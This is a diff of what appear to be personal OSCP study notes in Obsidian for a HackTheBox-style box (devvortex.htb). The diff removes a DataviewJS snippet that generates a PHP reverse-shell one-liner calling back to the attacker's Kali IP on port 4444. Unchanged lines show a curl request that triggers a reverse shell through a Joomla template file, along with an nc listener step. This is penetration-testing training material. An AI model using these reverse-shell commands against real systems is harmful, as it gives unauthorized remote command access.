@@ -16,13 +16,9 @@ dv.paragraph("```bash\n" + command + "\n```");
 ```
 
 PHP METHOD 1
-```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
-const command = `php -r '$sock=fsockopen("${KaliIP}",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`;
+[[Pentestmonkey php reverse shell]]
 
-dv.paragraph("```bash\n" + command + "\n```");
-```
 ---
 
 PHP METHOD 2
@@ -58,7 +54,7 @@ Trigger the reverse-shell
 curl -k "http://dev.devvortex.htb/templates/cassiopeia/error.php/error"
 ```
 
-PHP METHOD 2
+PHP METHOD 3
 
 Start a nc listener
 
